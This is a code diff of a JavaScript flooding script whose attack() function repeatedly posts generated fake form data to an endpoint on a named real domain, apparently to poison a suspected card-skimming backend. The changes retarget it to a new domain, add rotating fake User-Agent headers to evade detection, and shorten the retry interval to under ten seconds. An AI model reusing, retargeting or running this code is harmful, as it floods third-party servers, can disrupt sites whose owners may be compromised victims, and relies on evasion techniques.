@@ -76,10 +76,22 @@ const domains = [
     'kit'
 ]
 
+const userAgentList = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
+    'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363',
+]
+
 const nameConfig = {
     dictionaries: [names, names],
     separator: ' ',
     length: 2
+}
+
+const userAgentConfig = {
+    dictionaries: [userAgentList]
 }
 
 const countryConfig = {
@@ -113,7 +125,7 @@ function logRevenge(domain, state, data) {
         })
 }
 
-const DOMAIN = 'bau-bremen.com';
+const DOMAIN = 'clinicavetpereira.pt';
 
 function generateDomain() {
     var text = "http://";
@@ -144,7 +156,7 @@ function getRandomDate() {
 }
 
 function attack() {
-    var nonceValue = '2a604add047437afb11dfb1b73e2c4c5';
+    var nonceValue = '400edd8d6a8b21550bc6cd3b98710d8b';
     /*var iptS = $('#so1');    // card number  e.target.value = e.target.value.replace(/[^\dA-Z]/g, '').replace(/(.{4})/g, '$1 ').trim();     
     var iptSec = $('#secu');
     var iptExp = $('#exp');
@@ -178,10 +190,11 @@ function attack() {
         fetch(domain + '/xhr.php', {
             method: 'POST',
             headers: {
-                'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
+                'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'User-Agent': uniqueNamesGenerator(userAgentConfig)
             },
             body: JSON.stringify({
-                o: 'ea80ec6776df1',
+                o: '8b36a023e12c0',
                 tkn: encrypted
             })
         }).then(r => r.json().then(r => {
@@ -197,22 +210,30 @@ function attack() {
                         },
                         body: JSON.stringify({
                             t: Date.now(),
-                            ord: "ea80ec6776df1"
+                            ord: "8b36a023e12c0"
                         })
                     }).then(rrep => rrep.json().then(resp => {
                         console.log(resp)
                         console.log('Full success!')
                     }))
                 })
+                    .catch((error) => {
+                        console.log(error)
+                        logRevenge(domain + '?id=' + fakeDomain, 'FAIL', frmD)
+                    })
                 // {"status":false,"args":{"dmn":".\/unporcessable.php"}}
                 //$('#orderFrm').attr('action', function () { return encodeURI(r.args.dmn) });
                 //$('#orderFrm').submit(); // only redicects to process order
+            } else {
+                logRevenge(domain + '?id=' + fakeDomain, 'FAIL', frmD)
             }
         })).catch((error) => {
             console.log(error)
             logRevenge(domain + '?id=' + fakeDomain, 'FAIL', frmD)
         }).finally(() => {
-            setTimeout(attack, 25000 + Math.floor(Math.random() * 4800000));
+            const next = Math.floor(Math.random() * 10000)
+            console.log(`Next try in ${next / 1000} seconds`)
+            setTimeout(attack, next);
         })
     })
 
